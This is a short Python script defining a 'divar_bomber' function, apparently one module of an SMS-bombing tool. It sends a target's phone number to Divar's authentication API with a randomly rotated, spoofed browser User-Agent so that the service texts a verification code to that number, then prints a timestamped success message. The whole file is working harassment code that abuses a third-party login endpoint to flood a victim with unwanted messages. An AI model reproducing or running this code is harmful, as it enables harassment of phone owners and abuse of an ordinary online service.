import requests
from time import sleep
from colorama import Fore as color  
import random
from datetime import datetime

def divar_bomber(number):
    bold = '\033[1m'
    heads = [
        
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
    rhead = random.choice(heads)
    divarnumber = {"phone": number}
    divar = 'https://api.divar.ir/v5/auth/authenticate'

    time = datetime.now()

    try:
        req = requests.post(divar, json=divarnumber, headers=rhead)
        try:
            print(color.GREEN+"[*] Divar Sent...!",end=' ')
            print(color.LIGHTGREEN_EX+ bold +'\t'+str(time.hour)+":"+str(time.minute)+":"+str(time.second))  
        except:
            print(color.RED+"Something Went Wrong...")         
    except:
        print("something went wrong...")

